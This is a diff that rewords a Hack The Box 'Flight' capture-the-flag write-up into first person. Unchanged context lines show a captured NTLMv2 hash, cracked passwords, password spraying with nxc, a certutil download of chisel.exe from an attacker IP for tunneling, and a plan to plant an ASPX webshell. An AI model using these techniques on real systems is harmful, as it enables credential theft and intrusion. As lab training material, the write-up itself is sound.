@@ -61,7 +61,7 @@ Responder catches it immediately:
 [SMB] NTLMv2-SSP Hash     : svc_apache::flight:6ba2222f7b36a6f9:53CFB09050429729CE11022D457A7409:...
 ```
 
-Hash cracks fast:
+The hash cracked quickly:
 
 > `svc_apache` / `S@Ss!K@*t13`
 
@@ -75,7 +75,7 @@ nxc smb $DC -u usernames.txt -p 'S@Ss!K@*t13' --continue-on-success
 [+] flight.htb\S.Moon:S@Ss!K@*t13
 ```
 
-`S.Moon` reuses the same password. Checking her share permissions:
+`S.Moon` reuses the same password. I checked her share permissions:
 
 ```bash
 nxc smb $DC -u s.moon -p $PASS --shares
@@ -102,6 +102,8 @@ I used `desktop.ini` specifically because the share only allowed `.ini` files wh
 ```
 
 > `c.bum` / `Tikkycoll_431012284`
+
+Got c.bum. Now let's see what he's got.
 
 ![BloodHound graph showing c.bum is a member of WebDevs@flight.htb](/images/writeups/htb-flight/bloodhound-cbum-webdevs.png)
 
@@ -153,7 +155,7 @@ Now running as c.bum. Winpeas turned up something good immediately:
 
 ![winpeas output highlighting IIS listening on 127.0.0.1:8000](/images/writeups/htb-flight/winpeas-iis-port8000.png)
 
-There's an IIS server running internally on port 8000, bound to loopback only. Tunnel it with Chisel:
+There's an IIS server running internally on port 8000, bound to loopback only. I needed to expose it to my machine, so I tunneled it out with Chisel:
 
 ```bash
 # on target
@@ -166,7 +168,7 @@ certutil -urlcache -f http://10.10.17.85:9000/chisel.exe chisel.exe
 
 ![Internal IIS site showing a flight ticket ordering application](/images/writeups/htb-flight/iis-internal-site.png)
 
-A flight ticket ordering app. Nothing obviously exploitable in the app itself. The interesting part is where it lives: `C:\inetpub\development`. Checked the ACLs:
+A flight ticket ordering app. Nothing obviously exploitable in the app itself. The interesting part is where it lives: `C:\inetpub\development`. I checked the ACLs:
 
 ```bash
 icacls "C:\inetpub\development" | findstr -i "c.bum WebDevs Users Everyone"
@@ -174,7 +176,7 @@ icacls "C:\inetpub\development" | findstr -i "c.bum WebDevs Users Everyone"
 C:\inetpub\development flight\c.bum:(OI)(CI)(W)
 ```
 
-C.Bum has write access. Which means I can drop an ASPX webshell directly into the IIS site root.
+C.Bum has write access. Nice. That means I can drop an ASPX webshell directly into the IIS site root.
 
 I went with Antak, the PowerShell-based webshell from Nishang. HTB academy nostalgia aside, it runs PS commands directly in the browser which is useful for quick enumeration before stabilizing a shell.
 
